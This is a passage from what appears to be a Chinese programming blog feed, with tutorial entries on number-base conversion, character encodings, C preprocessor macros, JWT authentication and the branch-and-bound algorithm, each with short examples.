转二进制为例：<br>将其以2的幂次方和分解，显然有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mo>=</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>0</mn><mo>∗</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">6=1*2^2+1*2^1+0*2^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span>，因此， <code>6(10)=110(2)</code><br>如果使用 <code>倒除法</code> 表示这一过程，就是：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240829145058.png" alt="image.png|400"></p><p>事实上，如果要把十进制数转换为k进制数，只需要将倒除法的除数换为 <code>k</code> 即可，仍然将余数从下到上逆序拼接得到对应的k进制数。例如要转为16进制，则将上图中的除数2换成16即可。</p><h2 id="k进制转十进制">k进制转十进制</h2><p>以 <code>110(2)</code> 转十进制为例：<br>类似地就有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>110</mn><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>0</mn><mo>∗</mo><msup><mn>2</mn><mn>0</mn></msup><mo>=</mo><mn>6</mn><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">110(2)=1*2^2+1*2^1+0*2^0=6(10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 这样将其进行分解并求和，即可得到对应的十进制数6</p><p>事实上，如果要把k进制数转换为10进制数，只需要将各项权重的底数换为 <code>k</code> 即可，将多项式求和即可得到对应的十进制数。例如要将k进制数转换为十进制数，则使用类似 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msup><mi>k</mi><mn>0</mn></msup><mo>+</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msup><mi>k</mi><mn>1</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">num(k)=x_0*k^0+x_1*k^1+...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span> 的分解即可。、</p><h2 id="8421法则">8421法则</h2><p>16,8,4,2,1这几个数有着巧妙的关系：它们都是2的幂次方。基于这个特性，我们在将二进制数转换为八进制或者十六进制的时候，可以直接将二进制串进行分组，分组直接转换为对应的八进制或者十六进制数，然后各组直接拼接即可。</p><p>例如：<br>二进制数 <code>10100101(2)</code> 转换为16进制数时，四位一组进行分组得到 <code>1010|0101</code> ；第一组直接得到 <code>1010(2)=8+0+2+0=10(10)=A(16)</code>，第二组直接得到 <code>0101(2)=0+4+0+1=5(10)</code>；然后直接拼接即可得到对应的十六进制数 <code>A5(16)</code></p><p>再例如：<br>二进制数 <code>10100101(2)</code> 转换为8进制数时，三位一组进行分组得到 <code>010|100|101</code> （高位补0）；第一组直接得到 <code>010(2)=0+2+0=2(10)=2(8)</code>，第二组直接得到 <code>100(2)=4+0+0=4(10)=4(8)</code>，第三组直接得到 <code>101(2)=4+0+1=5(10)=5(8)</code> ；然后直接拼接即可得到对应的八进制数 <code>245(8)</code></p><p>这就是 <code>8421法则</code> 和 <code>421法则</code>，利用了源进制和目标进制都是2的幂次方的特点，并且由于权重很小，所以直接即为8、4、2、1即可，这样大大简化了2的幂次方进制数之间的转换。</p><p>事实上，在计算机中，由于二进制数太过繁琐，因此几乎总是使用对应的十六进制数进行表示，因此彼此之间的转换应该烂熟于心。</p><h1 id="字符编码">字符编码</h1><p>在计算机科学中，<code>字符编码</code>定义了字符的表示、编码和处理方式。了解字符标准对于编写能够处理文本数据的程序至关重要。</p><h2 id="ascii编码">ASCII编码</h2><p>最早和最广泛使用的字符编码标准是<code>美国信息交换标准代码（American Standard Code for Information Interchange，简称ASCII）</code>。ASCII使用7位二进制数来表示128个不同的字符，包括：</p><ul><li>大写和小写英文字母（A-Z，a-z）</li><li>数字0-9</li><li>空格</li><li>标点符号</li><li>控制字符（一些特殊字符，用来控制计算机）</li></ul><p>ASCII编码示例：</p><ul><li>空格字符<code> </code>的ASCII码是32。</li><li>大写字母<code>'A'</code>的ASCII码是65。</li><li>小写字母<code>'a'</code>的ASCII码是97。</li></ul><p>实际上，由于计算机中一个字节为8位二进制数，因此一个ASCII字符一般使用一个完整的字节来存储（例如C语言中保存单个字符的char类型就是1个字节）。</p><p>注：完整的ASCII码表详见：<a href="https://zh.wikipedia.org/wiki/ASCII">ASCII - 维基百科，自由的百科全书</a></p><h2 id="unicode编码">Unicode编码</h2><p>随着全球化的发展，仅仅支持英文字符的<code>ASCII</code>逐渐不能满足需求，因为它无法表示世界上所有的字符（例如中文、日文字符）。<code>统一字符集（Unicode）</code>被创建用以支持更多的字符。Unicode是一个更全面的标准，它能够表示世界上几乎所有的书写系统的字符。</p><p>Unicode以下包括多种编码形式，其中最常用的是：</p><ul><li>UTF-8：一种变长编码方式，使用1到4个字节表示一个字符，它与ASCII码兼容。</li><li>UTF-16：使用2个或4个字节表示字符。</li><li>UTF-32：使用固定4个字节表示每个字符。</li></ul><p>上面三种编码，在不同的场景有着不同的选择，例如Java语言使用UTF-16编码存储字符；而Golang则使用UTF-8作为默认编码；Linux操作系统默认使用UTF-8编码，等等。</p><h2 id="其他编码">其他编码</h2><p>在不同的平台、国家或地区，有着许许多多的其他字符编码，例如：</p><ul><li>GBK：汉字内码扩展规范，收录有两万多个汉字等。</li><li>大五码：繁体中文字符集标准。<br>这些字符都在特定场合有着用武之地，当然，一般情况下ASCII和UTF-8即可满足我们大部分的需求。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-17-预处理器</title>
      <link href="/2024dfb5f5f4194f/"/>
      <url>/2024dfb5f5f4194f/</url>
      
        <content type="html"><![CDATA[<p>预备知识：</p><ul><li>头文件</li></ul><p>C程序在编译前，要进行一个 <code>预处理</code> 操作，这个操作主要的工作是根据 <code>预处理指令</code> 对C源代码中的一些文本进行转换操作，生成另外的特定文本。</p><p>每一条预处理指令都由一个 <code>#</code> 开头，后接具体的指令内容。我们会介绍C语言中的各种 <code>预处理指令</code> ，他们对于C程序至关重要，例如包含文件、定义常量、选择编译等等。</p><p>当然，在此之前，我们其实已经见过了不少的宏定义指令了，但是仅仅一带而过，并未详细展开，在这里会进行详细讲解。</p><h1 id="替换文本宏：-define和-undef">替换文本宏：#define和#undef</h1><h2 id="语法：">语法：</h2><ul><li><code>#define 标识符 替换列表</code></li><li><code>#define 标识符(形参) 替换列表</code></li><li><code>#define 标识符(形参...) 替换列表</code> （C99起）</li><li><code>#define 标识符(...) 替换列表</code> （C99起）</li><li><code>#undef 标识符</code></li></ul><p>注：考虑到本文面向初学者，上述语法中C99新增的2种在此并不展开讲解，读者可以自行查阅相关资料。</p><h2 id="解释：">解释：</h2><p><code>#define</code> 指令定义 <strong>标识符</strong> 为 <code>宏</code> ，即后面所有出现的该 <strong>标识符</strong> 均被替换为 <strong>形参列表</strong>，并且这个替换是 <code>纯文本替换</code> ，并不涉及任何的算术运算。<br>注：标识符被定义为宏常称为“宏定义”，常称这种替换为 “宏替换”。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> A_NUM 2333</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = A_NUM;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i=2333</span><br></pre></td></tr></table></figure><p>这里将 <code>#define</code> 指令后面所有的标识符 <strong>A_NUM</strong> 全部简单地替换为 <strong>形参列表</strong> 表示的文本“2333”，这样，源代码中对变量 <code>i</code> 的赋值就变成了 <code>int i = 2333;</code><br><br></p><p>另一方面，需要注意语法中特别强调了 <strong>标识符</strong> ，这意味着其必须符合前面所述的 <code>标识符命名规则</code>，否则程序报错；此外，这也意味着，如果在字符串中包含了该 <strong>标识符</strong> 文本，他会被视为字符串的一部分，并不会替换。<br>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HELLO hello</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;str=%s&quot;</span>,str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=HELLO</span><br></pre></td></tr></table></figure><p>显然，此时并没有发生替换，也就是说 <code>&quot;HELLO&quot;</code> 被视为一个普通的字符串，不会进行宏替换。</p><p>以上这种简单替换标识符的宏被称为 <code>仿对象宏</code>。<br><br><br>宏定义也可以类似函数那样使用<strong>形参</strong>，唯一的区别是，宏定义的<strong>形参</strong>没有类型，它依然是一个简单的文本替换。<br>例如，我们尝试使用宏来实现一个简单的求2者最大值的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x,y) (x&gt;y?x:y)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">3</span>,j=<span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> max_num = MAX(i,j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;max_num = %d&quot;</span>,max_num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_num = 4</span><br></pre></td></tr></table></figure><p>而且由于形参x和y并没有类型限制，所以可以传入任何可以比大小的2个值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x,y) (x&gt;y?x:y)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> i=<span class="number">3.14</span>,j=<span class="number">12.5</span>;</span><br><span class="line"><span class="type">double</span> max_num = MAX(i,j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;max_num = %.2lf&quot;</span>,max_num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_num = 12.50</span><br></pre></td></tr></table></figure><p>像这样定义的函数称为 <code>仿函数宏</code>，当然，许多人将其称为 <code>宏函数</code> ，并无伤大雅。</p><br>而对于 `#undef` 指令，用于解除前面的 `#define` 指令所定义的宏，若标识符无与之关联的宏，则忽略此指令。例如下面的代码，在定义变量 j 的时候便会报错表示宏 `A_NUM` 未定义：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> A_NUM 2333</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = A_NUM + <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> A_NUM</span></span><br><span class="line"><span class="type">int</span> j = A_NUM + <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d,j = %d&quot;</span>, i, j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="特殊操作：-运算符与-运算符">特殊操作：#运算符与##运算符</h2><p>宏替换是纯文本，自然让我们想到一些字符串连接操作， <code>#</code>和 <code>##</code> 运算符实现了这一点。</p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT鉴权</title>
      <link href="/2024b336a5921d4e/"/>
      <url>/2024b336a5921d4e/</url>
      
        <content type="html"><![CDATA[<h1 id="跨域认证">跨域认证</h1><p>物联网服务离不开身份认证，常规的方法是：</p><ol><li>用户发送账号密码</li><li>服务器验证通过后，在当前session中保存登录记录，包括用户信息、登录时间等</li><li>服务器向用户返回一个<code>session_id</code>，写入用户的<code>cookie</code></li><li>之后用户每次访问都带上该cookie，服务器根据cookie携带的session_id进行身份识别</li></ol><p>该方法需要服务器保存用户登录信息，如果服务器需要集群，或者是跨域，就必须将session共享。当然，可以考虑将session数据持久化，让服务向持久层请求数据。<br>但是这样的方法会给服务器或持久层带来压力，当用户量很大的时候，需要存储的数据会很大，给内存带来压力。</p><p>另一种解决方案是使用<code>token</code>，由客户端保存服务器分发的<code>token</code>，在请求服务时携带<code>token</code>，由服务端使用对应的算法验证该<code>token</code>是否合法，如果通过则继续提供服务。</p><p><code>JWT</code>就属于使用token方案的一个代表技术。</p><h1 id="jwt概述">JWT概述</h1><p>JWT（JSON Web Token）的原理是：服务器通过第一次认证后，生成一个JSON对象作为token返回给用户，以后的每次请求都携带该JSON对象用于鉴权，而服务器无需再保存session数据，完全靠该JSON对象验证身份。</p><p>由于是由用户存储该JSON对象，为了防止篡改，服务器在其后面会加上签名。</p><h2 id="jwt结构">JWT结构</h2><p>JWT由三部分组成，彼此之间使用<code>.</code>分隔，并且无换行：</p><ol><li>Header：头部</li><li>Payload：负载</li><li>Signature：签名</li></ol><p>Header描述JWT的 <code>元数据</code>，包括<code>签名算法</code>和token的<code>类型</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后使用Base64进行编码</p><p>Payload存放实际需要传递的数据，有如下几个官方字段供选用：</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号<br>当然也可以定义私有字段，但是注意JWT默认不加密，请不要放秘密信息在这里。</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后同样使用Base64进行编码</p><p>Signature是对前两个部分的签名，以防止数据篡改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(<span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> + <span class="title function_">base64UrlEncode</span>(payload), secret)</span><br></pre></td></tr></table></figure><p>三个部分都计算完成后，将其拼接成一个完整的字符串，中间由<code>.</code>连接，然后就可以返回给用户。</p><h2 id="jwt的使用">JWT的使用</h2><p>服务端生成JWT数据后，用户每次请求就都需要携带该JSON数据。<br>例如可以将其放在cookie中自动发送，但是这样不能进行跨域，因此更一般的做法是将其作为http请求的<code>Authorization</code>字段进行发送</p><h2 id="jwt的特点">JWT的特点</h2><ul><li>JWT默认不加密，在未加密的情况下，不要将秘密放在JWT中</li><li>JWT可以在生成初始token后再使用密钥进行一次加密</li><li>JWT无法中途销毁，在其有效时间之前一直保持有效</li><li>JWT包含验证信息，要避免泄露，否则他人可以直接获得其所有权限，所以应该使用https进行传输</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分支界限法</title>
      <link href="/20245f401b0c1d3c/"/>
      <url>/20245f401b0c1d3c/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>分支限界法</code>是用于离散优化、组合优化以及数学优化问题的算法设计范式。其可以视为一种对可行解进行穷举的算法，但是在对某一分支进行检索之前会先算出该分支的上界或下界，如果界限不比目前最佳解更好，那么该分支就会被舍弃，从而节约了大量的时间。</p><p>分支定界算法非常依赖合适的上界或下界，如果无法找到合适的界限，该算法将会退化为穷举法。<br>和回溯法相同，分支界限法也是用<code>状态空间树</code>来进行组织。</p><p>与回溯法的区别：</p><ul><li>求解目标：<code>回溯法</code>的求解目标是找出解空间树中满足约束条件的所有解；而<code>分支限界法</code>则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。</li><li>搜索方式：<code>回溯法</code>以深度优先的方式搜索解空间树；而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。</li></ul><h1 id="基本思想">基本思想</h1><p>以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。</p><p>在搜索过程中，对已处理的各结点根据<code>限界函数</code>估算目标函数的可能取值，从中选取使目标函数取得极值（极大/极小）的结点优先进行广度优先搜索，并不断调整搜索方向，以尽快找到解。</p><p>其中，<code>限界函数</code>常基于问题的目标函数，适用于求解最优化问题。</p><p>具体过程：<br>在遍历解空间（<code>活结点列表</code>）时，当到达某一结点（<code>扩展结点</code>）时，先判断该结点是否包含问题的解，如果包含，则产生其全部子节点，并将其中不可行解或导致次优解的子节点丢弃，然后将剩下的子节点加入<code>活结点列表</code></p><p>此后，每次从<code>活结点列表</code>中取下一个结点作为当前的<code>扩展结点</code>，继续上述步骤，直到找到解或者列表为空为止。</p><h1 id="两种分支界限法">两种分支界限法</h1><h2 id="队列式分支界限法">队列式分支界限法</h2><p>FIFO原则选取下一个扩展结点</p><h2 id="优先队列式分支界限法">优先队列式分支界限法</h2><p>根据优先队列的优先级规则选取优先级最高的结点作为下一个扩展结点</p><h1 id="算法流程">算法流程</h1><h2 